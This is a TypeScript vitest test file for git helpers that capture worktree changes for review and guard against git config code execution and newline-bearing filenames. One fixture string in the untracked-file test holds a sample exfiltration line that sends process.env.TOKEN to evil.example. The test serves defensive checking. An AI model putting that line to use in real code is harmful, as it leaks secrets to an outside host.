import { describe, expect, it, vi } from "vitest";
import { ServerBusyError } from "../src/exec.js";
import type { Exec } from "../src/exec.js";
import {
  GIT_HARDENING_ENV,
  GIT_HARDENING_TOPLEVEL,
  MAX_UNTRACKED_FILE_BYTES,
  captureChange,
  hardenedGitArgs,
  isGitRepo,
  worktreeDirty,
} from "../src/git.js";

// The hardened opts every git call is invoked with: worktree cwd + the fixed
// GIT_HARDENING_ENV that neutralises system/global config execution vectors.
const hardenedOpts = (cwd: string) => ({ cwd, env: GIT_HARDENING_ENV });

const mockExec = (
  calls: Array<{
    args: string[];
    result: { stdout: string; stderr: string; exitCode: number | null };
  }>,
) => {
  const fn = vi.fn<Exec>();
  for (const _call of calls) {
    fn.mockImplementation(async (binary: string, args: string[], _opts?: { cwd?: string }) => {
      const match = calls.find((c) => JSON.stringify(c.args) === JSON.stringify(args));
      if (match) return match.result;
      throw new Error(`unexpected call: ${binary} ${args.join(" ")}`);
    });
  }
  return fn;
};

describe("isGitRepo", () => {
  it("returns true when git rev-parse reports inside a work tree", async () => {
    const exec = mockExec([
      {
        args: hardenedGitArgs(["rev-parse", "--is-inside-work-tree"]),
        result: { stdout: "true\n", stderr: "", exitCode: 0 },
      },
    ]);

    const result = await isGitRepo(exec, "/repo");

    expect(result).toBe(true);
    expect(exec).toHaveBeenCalledWith(
      "git",
      hardenedGitArgs(["rev-parse", "--is-inside-work-tree"]),
      hardenedOpts("/repo"),
    );
  });

  it("returns false when git rev-parse exits non-zero", async () => {
    const exec = mockExec([
      {
        args: hardenedGitArgs(["rev-parse", "--is-inside-work-tree"]),
        result: { stdout: "", stderr: "x", exitCode: 128 },
      },
    ]);

    const result = await isGitRepo(exec, "/not-a-repo");

    expect(result).toBe(false);
    expect(exec).toHaveBeenCalledWith(
      "git",
      hardenedGitArgs(["rev-parse", "--is-inside-work-tree"]),
      hardenedOpts("/not-a-repo"),
    );
  });

  it("propagates thrown errors instead of resolving false", async () => {
    const exec = vi.fn<Exec>().mockRejectedValue(new ServerBusyError());

    await expect(isGitRepo(exec, "/repo")).rejects.toBeInstanceOf(ServerBusyError);
  });

  it("returns false for a completed non-true result", async () => {
    const exec = mockExec([
      {
        args: hardenedGitArgs(["rev-parse", "--is-inside-work-tree"]),
        result: { stdout: "false\n", stderr: "", exitCode: 0 },
      },
    ]);

    const result = await isGitRepo(exec, "/repo");

    expect(result).toBe(false);
    expect(exec).toHaveBeenCalledWith(
      "git",
      hardenedGitArgs(["rev-parse", "--is-inside-work-tree"]),
      hardenedOpts("/repo"),
    );
  });
});

describe("worktreeDirty", () => {
  it("returns true when status --porcelain produces output", async () => {
    const exec = mockExec([
      {
        args: hardenedGitArgs(["status", "--porcelain"]),
        result: { stdout: " M file.txt\n", stderr: "", exitCode: 0 },
      },
    ]);

    const result = await worktreeDirty(exec, "/repo");

    expect(result).toBe(true);
    expect(exec).toHaveBeenCalledWith(
      "git",
      hardenedGitArgs(["status", "--porcelain"]),
      hardenedOpts("/repo"),
    );
  });

  it("returns false when status --porcelain is empty", async () => {
    const exec = mockExec([
      {
        args: hardenedGitArgs(["status", "--porcelain"]),
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
    ]);

    const result = await worktreeDirty(exec, "/repo");

    expect(result).toBe(false);
    expect(exec).toHaveBeenCalledWith(
      "git",
      hardenedGitArgs(["status", "--porcelain"]),
      hardenedOpts("/repo"),
    );
  });
});

describe("captureChange", () => {
  it("surfaces an unreadable untracked file as a placeholder, not a silent empty body", async () => {
    // git exits >1 when it cannot read the file (e.g. permission denied); an
    // empty body would read to the reviewer as "nothing to see", hiding content.
    const exec = mockExec([
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs(["ls-files", "--others", "--exclude-standard", "-z"]),
        result: { stdout: "locked.bin\0", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs([
          "diff",
          "--no-ext-diff",
          "--no-textconv",
          "--no-index",
          "--",
          "/dev/null",
          "locked.bin",
        ]),
        result: { stdout: "", stderr: "fatal: cannot read", exitCode: 128 },
      },
    ]);

    const result = await captureChange(exec, "/repo");

    expect(result.untracked).toHaveLength(1);
    expect(result.untracked[0].path).toBe("locked.bin");
    expect(result.untracked[0].truncated).toBe(true);
    expect(result.untracked[0].content).toMatch(/unreadable/i);
  });

  it("parses stat, diff, and untracked with blank segments dropped", async () => {
    const exec = mockExec([
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
        result: { stdout: " file.txt | 5 ++++\n\n", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
        result: { stdout: "@@ -1,3 +1,5 @@\n+new line\n", stderr: "", exitCode: 0 },
      },
      {
        // `-z` NUL-delimited output; an empty segment between paths must be dropped.
        args: hardenedGitArgs(["ls-files", "--others", "--exclude-standard", "-z"]),
        result: { stdout: "new-file.txt\0\0another.txt\0", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs([
          "diff",
          "--no-ext-diff",
          "--no-textconv",
          "--no-index",
          "--",
          "/dev/null",
          "new-file.txt",
        ]),
        result: { stdout: "+first body\n", stderr: "", exitCode: 1 },
      },
      {
        args: hardenedGitArgs([
          "diff",
          "--no-ext-diff",
          "--no-textconv",
          "--no-index",
          "--",
          "/dev/null",
          "another.txt",
        ]),
        result: { stdout: "+second body\n", stderr: "", exitCode: 1 },
      },
    ]);

    const result = await captureChange(exec, "/repo");

    expect(result.stat).toBe(" file.txt | 5 ++++\n\n");
    expect(result.diff).toBe("@@ -1,3 +1,5 @@\n+new line\n");
    expect(result.untrackedTruncated).toBe(false);
    expect(result.untracked).toEqual([
      { path: "new-file.txt", content: "+first body\n", truncated: false },
      { path: "another.txt", content: "+second body\n", truncated: false },
    ]);
    expect(exec).toHaveBeenNthCalledWith(
      1,
      "git",
      hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
      hardenedOpts("/repo"),
    );
    expect(exec).toHaveBeenNthCalledWith(
      2,
      "git",
      hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
      hardenedOpts("/repo"),
    );
    expect(exec).toHaveBeenNthCalledWith(
      3,
      "git",
      hardenedGitArgs(["ls-files", "--others", "--exclude-standard", "-z"]),
      hardenedOpts("/repo"),
    );
  });

  it("returns the CONTENTS of an untracked file, not just its name", async () => {
    const malicious = "+const exfil = () => fetch('http://evil.example/' + process.env.TOKEN);\n";
    const exec = mockExec([
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs(["ls-files", "--others", "--exclude-standard", "-z"]),
        result: { stdout: "payload.ts\0", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs([
          "diff",
          "--no-ext-diff",
          "--no-textconv",
          "--no-index",
          "--",
          "/dev/null",
          "payload.ts",
        ]),
        result: { stdout: malicious, stderr: "", exitCode: 1 },
      },
    ]);

    const result = await captureChange(exec, "/repo");

    expect(result.untracked).toHaveLength(1);
    expect(result.untracked[0].path).toBe("payload.ts");
    expect(result.untracked[0].content).toContain("exfil");
    expect(result.untracked[0].content).toContain("process.env.TOKEN");
    expect(result.untracked[0].truncated).toBe(false);
    expect(exec).toHaveBeenCalledWith(
      "git",
      hardenedGitArgs([
        "diff",
        "--no-ext-diff",
        "--no-textconv",
        "--no-index",
        "--",
        "/dev/null",
        "payload.ts",
      ]),
      hardenedOpts("/repo"),
    );
  });

  it("truncates an untracked file that exceeds the per-file byte cap", async () => {
    const huge = "x".repeat(MAX_UNTRACKED_FILE_BYTES + 500);
    const exec = mockExec([
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs(["ls-files", "--others", "--exclude-standard", "-z"]),
        result: { stdout: "big.bin\0", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs([
          "diff",
          "--no-ext-diff",
          "--no-textconv",
          "--no-index",
          "--",
          "/dev/null",
          "big.bin",
        ]),
        result: { stdout: huge, stderr: "", exitCode: 1 },
      },
    ]);

    const result = await captureChange(exec, "/repo");

    expect(result.untracked[0].truncated).toBe(true);
    expect(Buffer.byteLength(result.untracked[0].content, "utf8")).toBe(MAX_UNTRACKED_FILE_BYTES);
  });

  it("propagates when the diff call throws", async () => {
    const exec = vi.fn<Exec>().mockRejectedValue(new ServerBusyError());

    await expect(captureChange(exec, "/repo")).rejects.toBeInstanceOf(ServerBusyError);
  });

  it("propagates when a later git call rejects", async () => {
    const exec = vi.fn<Exec>();
    exec.mockImplementationOnce(async () => ({
      stdout: " file.txt | 1 +\n",
      stderr: "",
      exitCode: 0,
    }));
    exec.mockImplementationOnce(async () => {
      throw new ServerBusyError();
    });
    exec.mockImplementationOnce(async () => ({
      stdout: "",
      stderr: "",
      exitCode: 0,
    }));

    await expect(captureChange(exec, "/repo")).rejects.toBeInstanceOf(ServerBusyError);
  });

  // --- Regression tests for the git-config execution hardening (P1-A / P2-B) ---

  it("P1-A: hardens EVERY git call against .git/config diff.external/textconv/fsmonitor RCE", async () => {
    const exec = mockExec([
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs(["ls-files", "--others", "--exclude-standard", "-z"]),
        result: { stdout: "one.ts\0", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs([
          "diff",
          "--no-ext-diff",
          "--no-textconv",
          "--no-index",
          "--",
          "/dev/null",
          "one.ts",
        ]),
        result: { stdout: "+x\n", stderr: "", exitCode: 1 },
      },
    ]);

    await captureChange(exec, "/repo");

    const gitCalls = exec.mock.calls;
    expect(gitCalls.length).toBeGreaterThan(0);

    for (const [binary, args, opts] of gitCalls as Array<
      [string, string[], { cwd?: string; env?: Record<string, string> }]
    >) {
      expect(binary).toBe("git");
      // GIT_HARDENING_TOPLEVEL is a prefix of every argv (`-c core.fsmonitor=` etc.).
      expect(args.slice(0, GIT_HARDENING_TOPLEVEL.length)).toEqual(GIT_HARDENING_TOPLEVEL);
      expect(args).toContain("-c");
      expect(args).toContain("core.fsmonitor=");
      // Every call ignores system/global config, which is where a hostile diff
      // driver would otherwise live.
      expect(opts.env).toBe(GIT_HARDENING_ENV);
      expect(opts.env?.GIT_CONFIG_NOSYSTEM).toBe("1");
      expect(opts.env?.GIT_CONFIG_GLOBAL).toBe("/dev/null");
    }

    // Both diff variants (`--stat` and plain) additionally disable the two
    // per-diff execution drivers.
    const diffCalls = (gitCalls as Array<[string, string[], unknown]>).filter(([, args]) =>
      args.includes("diff"),
    );
    expect(diffCalls.length).toBeGreaterThanOrEqual(2);
    for (const [, args] of diffCalls) {
      expect(args).toContain("--no-ext-diff");
      expect(args).toContain("--no-textconv");
    }
  });

  it("P2-B: `-z` parsing keeps newline-bearing filenames intact", async () => {
    // A hostile runner can name a file with an embedded newline; the old
    // "\n"-split + trim would shatter it into bogus paths and hide the payload.
    // NUL delimiting must yield exactly the two real paths.
    const exec = mockExec([
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "--stat", "HEAD"]),
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs(["diff", "--no-ext-diff", "--no-textconv", "HEAD"]),
        result: { stdout: "", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs(["ls-files", "--others", "--exclude-standard", "-z"]),
        result: { stdout: "weird\nname.txt\0normal.txt\0", stderr: "", exitCode: 0 },
      },
      {
        args: hardenedGitArgs([
          "diff",
          "--no-ext-diff",
          "--no-textconv",
          "--no-index",
          "--",
          "/dev/null",
          "weird\nname.txt",
        ]),
        result: { stdout: "+payload\n", stderr: "", exitCode: 1 },
      },
      {
        args: hardenedGitArgs([
          "diff",
          "--no-ext-diff",
          "--no-textconv",
          "--no-index",
          "--",
          "/dev/null",
          "normal.txt",
        ]),
        result: { stdout: "+ok\n", stderr: "", exitCode: 1 },
      },
    ]);

    const result = await captureChange(exec, "/repo");

    expect(result.untracked).toHaveLength(2);
    expect(result.untracked.map((u) => u.path)).toEqual(["weird\nname.txt", "normal.txt"]);

    // readUntracked is invoked once per real path — not once per mangled fragment.
    const readCalls = exec.mock.calls.filter(([, args]) =>
      (args as string[]).includes("--no-index"),
    );
    expect(readCalls).toHaveLength(2);
  });
});
